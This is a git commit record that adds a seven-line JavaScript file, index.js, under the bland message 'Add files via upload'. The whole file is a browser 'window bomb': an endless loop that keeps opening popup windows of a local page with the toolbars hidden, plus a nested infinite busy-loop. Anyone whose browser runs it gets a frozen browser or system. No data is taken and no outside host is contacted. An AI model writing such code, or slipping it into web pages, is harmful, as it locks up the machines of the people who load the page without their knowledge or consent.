c0becec8fa26ca8a0b0c705f7f3604a99dbeff4e
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 13:16:58 -0500

    Add files via upload

---
+++ index.js
@@ -0,0 +1,7 @@
+while(true)
+{
+window.open('file:///Users/Andrew/Desktop/index.html', '_blank', 'toolbar=0,location=0,menubar=0');
+setTimeout(function(){
+for(var i = 0; i === i; i++) {}
+}, 50); 
+}
